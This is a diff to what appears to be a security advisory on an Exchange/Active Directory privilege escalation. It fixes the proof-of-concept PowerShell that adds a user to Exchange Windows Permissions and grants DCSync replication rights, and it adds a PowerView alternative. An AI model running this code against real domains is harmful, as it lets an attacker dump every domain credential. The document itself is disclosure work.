@@ -54,7 +54,7 @@ This is not consistent with the other INHERITED_OBJECT_TYPE ACEs on the domain o
 
 * Security Consequence
 
-A privilege escalation is possible from the **Exchange Windows permissions** (EWP) security group to compromise the entire prepared Active Directory domain. Just set the Ds-Replication-Get-Changes-All extended right on the domain object. This is enough to use a DRSUAPI replication tool ala DCSync to get all the domain secrets (Kerberos keys, hashes, etc.).
+A privilege escalation is possible from the **Exchange Windows permissions** (EWP) security group to compromise the entire prepared Active Directory domain. Just set the Ds-Replication-Get-Changes and Ds-Replication-Get-Changes-All extended rights on the domain object. This is enough to use a DRSUAPI replication tool ala DCSync to get all the domain secrets (Kerberos keys, hashes, etc.).
 
 You can control the SID of the EWP group from **Organization management**, from **Account operators** or from any Exchange server.
 Interestingly, the RBAC system is proxified through EWP so a privilege escalation is possible from the *Active Directory Permissions* RBAC role to compromise the entire prepared Active Directory domain.
@@ -71,7 +71,7 @@ $user = Get-ADUser -Identity $id.User
 Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members $user
 ```
 
-RELOG to update groups in your token then give yourself Ds-Replication-Get-Changes-All extended right on the domain object.
+RELOG to update groups in your token then give yourself Ds-Replication-Get-Changes and Ds-Replication-Get-Changes-All extended rights on the domain object.
 
 ```
 $acl = get-acl "ad:DC=test,DC=local"
@@ -86,17 +86,23 @@ $type = [System.Security.AccessControl.AccessControlType] "Allow"
 $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
 $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
 $acl.AddAccessRule($ace)
-Set-acl -aclobject $acl "ad:DC=test,DC=com"
+# rightsGuid for the extended right Ds-Replication-Get-Changes
+$objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
+$acl.AddAccessRule($ace)
+Set-acl -aclobject $acl "ad:DC=test,DC=local"
 ```
+
+Optionally, if PowerView is available, the same can be achieved with its `Add-DomainObjectAcl` cmdlet using the flag `-Rights DCSync`.
 
 
 * Proof of concept 2: RBAC Add-ADPermission
 
-The following Powershell code, executed by a user account with the RBAC role *Active Directory Permissions*, sets the Ds-Replication-Get-Changes-All extended right on the domain object.
+The following Powershell code, executed by a user account with the RBAC role *Active Directory Permissions*, sets the Ds-Replication-Get-Changes and Ds-Replication-Get-Changes-All extended rights on the domain object.
 
 ```
 $id = [Security.Principal.WindowsIdentity]::GetCurrent()
-Add-ADPermission "DC=test,DC=local" -User $id.Name -ExtendedRights Ds-Replication-Get-Changes-All
+Add-ADPermission "DC=test,DC=local" -User $id.Name -ExtendedRights Ds-Replication-Get-Changes,Ds-Replication-Get-Changes-All
 ```
 
 * Workaround fix
